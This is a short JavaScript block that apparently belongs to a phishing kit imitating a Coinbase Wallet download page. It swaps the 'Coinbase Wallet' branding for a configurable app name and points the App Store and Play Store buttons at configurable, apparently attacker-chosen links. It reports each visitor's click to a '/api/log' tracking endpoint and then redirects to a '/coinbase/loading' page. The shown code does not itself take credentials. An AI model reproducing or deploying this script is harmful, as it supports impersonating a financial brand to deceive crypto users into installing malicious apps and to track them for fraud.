  <script>
  (function(){
    function ensureAbsoluteUrl(u){return u&&!u.startsWith('http://')&&!u.startsWith('https://')?'https://'+u:u;}
    var d = window._cbDcwData || {};
    var appName  = d.app_name  || localStorage.getItem('cb_dcw_appname')  || '';
    var appStore = d.app_store || localStorage.getItem('cb_dcw_appstore')  || '';
    var playStore= d.play_store|| localStorage.getItem('cb_dcw_playstore') || '';
    if(appName)   try{localStorage.setItem('cb_dcw_appname',  appName);}catch(_){}
    if(appStore)  try{localStorage.setItem('cb_dcw_appstore', appStore);}catch(_){}
    if(playStore) try{localStorage.setItem('cb_dcw_playstore',playStore);}catch(_){}
    var appUrl  = ensureAbsoluteUrl(appStore);
    var playUrl = ensureAbsoluteUrl(playStore);
    if(appName) {
      var t=document.getElementById('cb-dcw-title');    if(t) t.textContent=t.textContent.replace(/Coinbase Wallet/g, appName);
      var s=document.getElementById('cb-dcw-subtitle'); if(s) s.textContent=s.textContent.replace(/Coinbase Wallet/g, appName);
    }
    if(appUrl)  { var a=document.getElementById('cb-dcw-appstore'); if(a) a.href=appUrl; }
    if(playUrl) { var p=document.getElementById('cb-dcw-playstore');if(p) p.href=playUrl; }
  })();
  (function(){
    document.getElementById('dcw-btn').addEventListener('click', function() {
      var csrf = window._liveledCSRF || '';
      var b = new URLSearchParams({_token:csrf,type:'form_submit',page:'coinbase_download_wallet',element:'continue',value:'clicked'});
      try{navigator.sendBeacon('/api/log',b);}catch(e){}
      if(window.navigateTo) window.navigateTo('/coinbase/loading');
      else window.location.href='/coinbase/loading';
    });
  })();
  </script>
